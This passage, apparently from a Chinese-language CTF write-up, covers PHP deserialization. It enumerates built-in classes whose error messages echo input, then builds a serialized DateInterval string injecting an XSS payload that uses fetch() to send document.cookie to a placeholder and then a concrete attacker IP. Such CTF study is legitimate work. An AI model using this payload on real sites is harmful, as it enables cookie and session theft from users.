static-context">SplFixedArray</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">SplFixedArray</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">MultipleIterator</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">ReflectionException</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">ReflectionException</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">ReflectionException</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">ReflectionFunctionAbstract</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">ReflectionFunction</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">ReflectionFunction</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">ReflectionGenerator</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">ReflectionParameter</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">ReflectionParameter</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">ReflectionType</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">ReflectionNamedType</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">ReflectionMethod</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">ReflectionMethod</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">ReflectionClass</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">ReflectionClass</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">ReflectionObject</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">ReflectionObject</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">ReflectionProperty</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">ReflectionProperty</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">ReflectionClassConstant</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">ReflectionClassConstant</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">ReflectionExtension</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">ReflectionExtension</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">ReflectionZendExtension</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">ReflectionZendExtension</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">AssertionError</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">AssertionError</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">AssertionError</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">DOMException</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">DOMException</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">DOMException</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">DOMDocumentFragment</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">DOMDocument</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">DOMAttr</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">DOMElement</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">DOMText</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">DOMComment</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">DOMCdataSection</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">DOMEntityReference</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">DOMProcessingInstruction</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">DOMXPath</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">PDOException</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">PDOException</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">PDOException</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">PDOStatement</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">SimpleXMLElement</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">SimpleXMLElement</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">SimpleXMLIterator</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">SimpleXMLIterator</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">CURLFile</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">CURLFile</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">mysqli_sql_exception</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">mysqli_sql_exception</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">mysqli_sql_exception</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">mysqli</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">mysqli_result</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">mysqli_stmt</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">PharException</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">PharException</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">PharException</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">Phar</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">Phar</span><span class="token operator">::</span><span class="token constant">__destruct</span><span class="token class-name static-context">Phar</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">PharData</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">PharData</span><span class="token operator">::</span><span class="token constant">__destruct</span><span class="token class-name static-context">PharData</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">PharFileInfo</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">PharFileInfo</span><span class="token operator">::</span><span class="token constant">__destruct</span><span class="token class-name static-context">PharFileInfo</span><span class="token operator">::</span><span class="token constant">__toString</span>进程已结束<span class="token punctuation">,</span>退出代码<span class="token number">0</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>目的是让他的回显中包含可控字符串，除了echo之类的直接打印以外，如果能够报Error/Warning，也能够实现这一功能</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$classes</span> <span class="token operator">=</span> <span class="token function">get_declared_classes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#set_error_handler：处理 PHP 错误（非异常）</span><span class="token comment">#设置错误处理函数。它能够捕获 PHP 程序运行过程中产生的警告（E_WARNING）、通知（E_NOTICE）等非致命错误。</span><span class="token function">set_error_handler</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$errfile</span><span class="token punctuation">,</span> <span class="token variable">$errline</span><span class="token punctuation">)</span> <span class="token keyword">use</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$currentClass</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"Mzzz"</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"[FOUND] Class: <span class="token interpolation"><span class="token variable">$currentClass</span></span>\n"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"  └── Message: <span class="token interpolation"><span class="token variable">$errstr</span></span>\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$classes</span> <span class="token keyword">as</span> <span class="token variable">$class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$currentClass</span> <span class="token operator">=</span> <span class="token variable">$class</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token variable">$refClass</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectionClass</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$refClass</span><span class="token operator">-&gt;</span><span class="token function">isInstantiable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment">#isInstantiable()方法用于判断一个类是否能够被实例化，像抽象类、接口就不可以实例化。</span>            <span class="token variable">$instance</span> <span class="token operator">=</span> <span class="token variable">$refClass</span><span class="token operator">-&gt;</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Mzzz"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">#newInstance("Mzzz")会尝试用"Mzzz"作为参数来创建类的实例。如果类的构造函数不接受参数或者需要多个参数，这一步就可能会失败。</span>            <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$instance</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment"># catch (Throwable $e)：处理异常（Exception/Error）</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">#catch (Throwable $e)可以捕获所有类型的异常和错误，包括 PHP 7 引入的 Error 类。</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$e</span><span class="token operator">-&gt;</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"Mzzz"</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"[FOUND] Class: <span class="token interpolation"><span class="token variable">$class</span></span>\n"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"  └── Message: "</span> <span class="token operator">.</span> <span class="token variable">$e</span><span class="token operator">-&gt;</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token constant">D</span><span class="token punctuation">:</span>\phpstudy_pro\Extensions\php\php7<span class="token operator">.</span><span class="token number">3.4</span>nts\php<span class="token operator">.</span>exe <span class="token constant">D</span><span class="token punctuation">:</span>\untitled4\r3ctf<span class="token operator">.</span>php<span class="token punctuation">[</span><span class="token constant">FOUND</span><span class="token punctuation">]</span> <span class="token keyword">Class</span><span class="token punctuation">:</span> DateTime  └── Message<span class="token punctuation">:</span> <span class="token class-name static-context">DateTime</span><span class="token operator">::</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name return-type">Failed</span> to parse time <span class="token keyword type-declaration">string</span> <span class="token punctuation">(</span>Mzzz<span class="token punctuation">)</span> at position <span class="token number">0</span> <span class="token punctuation">(</span><span class="token constant">M</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name return-type">The</span> timezone could not be found in the database      <span class="token comment">#DateTime类在实例化时，会尝试把"Mzzz"解析成时间字符串，但是解析失败了，于是就把原始输入"Mzzz"包含在了错误信息里。</span><span class="token punctuation">[</span><span class="token constant">FOUND</span><span class="token punctuation">]</span> <span class="token keyword">Class</span><span class="token punctuation">:</span> DateTimeImmutable  └── Message<span class="token punctuation">:</span> <span class="token class-name static-context">DateTimeImmutable</span><span class="token operator">::</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name return-type">Failed</span> to parse time <span class="token keyword type-declaration">string</span> <span class="token punctuation">(</span>Mzzz<span class="token punctuation">)</span> at position <span class="token number">0</span> <span class="token punctuation">(</span><span class="token constant">M</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name return-type">The</span> timezone could not be found in the database<span class="token punctuation">[</span><span class="token constant">FOUND</span><span class="token punctuation">]</span> <span class="token keyword">Class</span><span class="token punctuation">:</span> DateTimeZone  └── Message<span class="token punctuation">:</span> <span class="token class-name static-context">DateTimeZone</span><span class="token operator">::</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name return-type">Unknown</span> <span class="token keyword">or</span> bad <span class="token function">timezone</span> <span class="token punctuation">(</span>Mzzz<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token constant">FOUND</span><span class="token punctuation">]</span> <span class="token keyword">Class</span><span class="token punctuation">:</span> DateInterval  └── Message<span class="token punctuation">:</span> <span class="token class-name static-context">DateInterval</span><span class="token operator">::</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name return-type">Unknown</span> <span class="token keyword">or</span> bad <span class="token function">format</span> <span class="token punctuation">(</span>Mzzz<span class="token punctuation">)</span>      <span class="token comment">#这表明DateInterval类在构造时会将无效参数直接包含在错误信息中，攻击者可利用这一点注入恶意代码。</span><span class="token punctuation">[</span><span class="token constant">FOUND</span><span class="token punctuation">]</span> <span class="token keyword">Class</span><span class="token punctuation">:</span> DatePeriod  └── Message<span class="token punctuation">:</span> <span class="token class-name static-context">DatePeriod</span><span class="token operator">::</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name return-type">Unknown</span> <span class="token keyword">or</span> bad <span class="token function">format</span> <span class="token punctuation">(</span>Mzzz<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token constant">FOUND</span><span class="token punctuation">]</span> <span class="token keyword">Class</span><span class="token punctuation">:</span> DirectoryIterator  └── Message<span class="token punctuation">:</span> <span class="token class-name static-context">DirectoryIterator</span><span class="token operator">::</span><span class="token function">__construct</span><span class="token punctuation">(</span>Mzzz<span class="token punctuation">,</span>Mzzz<span class="token punctuation">)</span><span class="token punctuation">:</span> ϵͳ�Ҳ���ָ�����ļ��� <span class="token punctuation">(</span><span class="token argument-name">code</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token constant">FOUND</span><span class="token punctuation">]</span> <span class="token keyword">Class</span><span class="token punctuation">:</span> FilesystemIterator  └── Message<span class="token punctuation">:</span> <span class="token class-name static-context">FilesystemIterator</span><span class="token operator">::</span><span class="token function">__construct</span><span class="token punctuation">(</span>Mzzz<span class="token punctuation">,</span>Mzzz<span class="token punctuation">)</span><span class="token punctuation">:</span> ϵͳ�Ҳ���ָ�����ļ��� <span class="token punctuation">(</span><span class="token argument-name">code</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token constant">FOUND</span><span class="token punctuation">]</span> <span class="token keyword">Class</span><span class="token punctuation">:</span> RecursiveDirectoryIterator  └── Message<span class="token punctuation">:</span> <span class="token class-name static-context">RecursiveDirectoryIterator</span><span class="token operator">::</span><span class="token function">__construct</span><span class="token punctuation">(</span>Mzzz<span class="token punctuation">,</span>Mzzz<span class="token punctuation">)</span><span class="token punctuation">:</span> ϵͳ�Ҳ���ָ�����ļ��� <span class="token punctuation">(</span><span class="token argument-name">code</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token constant">FOUND</span><span class="token punctuation">]</span> <span class="token keyword">Class</span><span class="token punctuation">:</span> SplFileObject  └── Message<span class="token punctuation">:</span> <span class="token class-name static-context">SplFileObject</span><span class="token operator">::</span><span class="token function">__construct</span><span class="token punctuation">(</span>Mzzz<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name return-type">failed</span> to open stream<span class="token punctuation">:</span> No such file <span class="token keyword">or</span> directory<span class="token punctuation">[</span><span class="token constant">FOUND</span><span class="token punctuation">]</span> <span class="token keyword">Class</span><span class="token punctuation">:</span> ReflectionFunction  └── Message<span class="token punctuation">:</span> <span class="token keyword">Function</span> <span class="token function-definition function">Mzzz</span><span class="token punctuation">(</span><span class="token punctuation">)</span> does not exist<span class="token punctuation">[</span><span class="token constant">FOUND</span><span class="token punctuation">]</span> <span class="token keyword">Class</span><span class="token punctuation">:</span> ReflectionMethod  └── Message<span class="token punctuation">:</span> Invalid method name Mzzz<span class="token punctuation">[</span><span class="token constant">FOUND</span><span class="token punctuation">]</span> <span class="token keyword">Class</span><span class="token punctuation">:</span> ReflectionClass  └── Message<span class="token punctuation">:</span> <span class="token keyword">Class</span> <span class="token class-name-definition class-name">Mzzz</span> does not exist<span class="token punctuation">[</span><span class="token constant">FOUND</span><span class="token punctuation">]</span> <span class="token keyword">Class</span><span class="token punctuation">:</span> ReflectionExtension  └── Message<span class="token punctuation">:</span> Extension Mzzz does not exist<span class="token punctuation">[</span><span class="token constant">FOUND</span><span class="token punctuation">]</span> <span class="token keyword">Class</span><span class="token punctuation">:</span> ReflectionZendExtension  └── Message<span class="token punctuation">:</span> Zend Extension Mzzz does not exist<span class="token punctuation">[</span><span class="token constant">FOUND</span><span class="token punctuation">]</span> <span class="token keyword">Class</span><span class="token punctuation">:</span> SimpleXMLElement  └── Message<span class="token punctuation">:</span> <span class="token class-name static-context">SimpleXMLElement</span><span class="token operator">::</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name return-type">Mzzz</span><span class="token punctuation">[</span><span class="token constant">FOUND</span><span class="token punctuation">]</span> <span class="token keyword">Class</span><span class="token punctuation">:</span> SimpleXMLIterator  └── Message<span class="token punctuation">:</span> <span class="token class-name static-context">SimpleXMLElement</span><span class="token operator">::</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name return-type">Mzzz</span><span class="token punctuation">[</span><span class="token constant">FOUND</span><span class="token punctuation">]</span> <span class="token keyword">Class</span><span class="token punctuation">:</span> Phar  └── Message<span class="token punctuation">:</span> Cannot create phar <span class="token string single-quoted-string">'Mzzz'</span><span class="token punctuation">,</span> file <span class="token function">extension</span> <span class="token punctuation">(</span><span class="token keyword">or</span> combination<span class="token punctuation">)</span> not recognised <span class="token keyword">or</span> the directory does not exist<span class="token punctuation">[</span><span class="token constant">FOUND</span><span class="token punctuation">]</span> <span class="token keyword">Class</span><span class="token punctuation">:</span> PharData  └── Message<span class="token punctuation">:</span> Cannot create phar <span class="token string single-quoted-string">'Mzzz'</span><span class="token punctuation">,</span> file <span class="token function">extension</span> <span class="token punctuation">(</span><span class="token keyword">or</span> combination<span class="token punctuation">)</span> not recognised <span class="token keyword">or</span> the directory does not exist<span class="token punctuation">[</span><span class="token constant">FOUND</span><span class="token punctuation">]</span> <span class="token keyword">Class</span><span class="token punctuation">:</span> PharFileInfo  └── Message<span class="token punctuation">:</span> <span class="token string single-quoted-string">'Mzzz'</span> is not a valid phar archive <span class="token function">URL</span> <span class="token punctuation">(</span>must have at least phar<span class="token punctuation">:</span><span class="token comment">//filename.phar)</span>进程已结束<span class="token punctuation">,</span>退出代码<span class="token number">0</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ul><li><code>$errno</code>：代表错误类型的代码。</li><li><code>$errstr</code>：是具体的错误信息字符串。</li><li><code>$errfile</code>：指出发生错误的文件路径。</li><li><code>$errline</code>：表示错误发生的行号。</li></ul></blockquote><p>除去not Serializable的类，尝试后发现 DateInterval和DatePeriod会把错误参数完整打印出来</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;script&gt;fetch("http://攻击者IP/?flag="+document.cookie)&lt;/script&gt;'</span><span class="token punctuation">;</span><span class="token comment">// 创建合法的 DateInterval 对象</span><span class="token variable">$class</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DateInterval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"P1D"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取序列化结构</span><span class="token comment">// 修改序列化字符串中的参数部分</span><span class="token variable">$ss</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">)</span>       <span class="token comment">// 保留头部结构</span>     <span class="token operator">.</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span>            <span class="token comment">// 更新payload长度</span>     <span class="token operator">.</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>      <span class="token comment">// 保留分隔符</span>     <span class="token operator">.</span> <span class="token variable">$exp</span>                    <span class="token comment">// 插入XSS payload</span>     <span class="token operator">.</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 保留尾部结构</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$ss</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出URL编码的payload</span><span class="token operator">::</span><span class="token operator">::</span><span class="token punctuation">:</span><span class="token operator">&lt;</span><span class="token operator">?</span>php<span class="token comment">//$exp = "&lt;script&gt;alert('success');&lt;/script&gt;";</span><span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;script&gt;fetch("http://47.76.93.208:8000/?flag="+document.cookie)&lt;/script&gt;'</span><span class="token punctuation">;</span><span class="token variable">$class</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DateInterval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"P1D"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$s</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token variable">$ss</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$exp</span> <span class="token operator">.</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$ss</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$ss</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$ss</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#110：定位到需要修改的字符串属性的起始位置（s:）</span><span class="token comment">#111：跳过 s:，指向长度值的起始位置</span><span class="token comment">#119：指向原字符串内容结束后的位置（即分号之后）</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"DateInterval"</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"y"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"m"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"d"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"h"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"i"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"s"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"f"</span><span class="token punctuation">;</span>d<span class="token 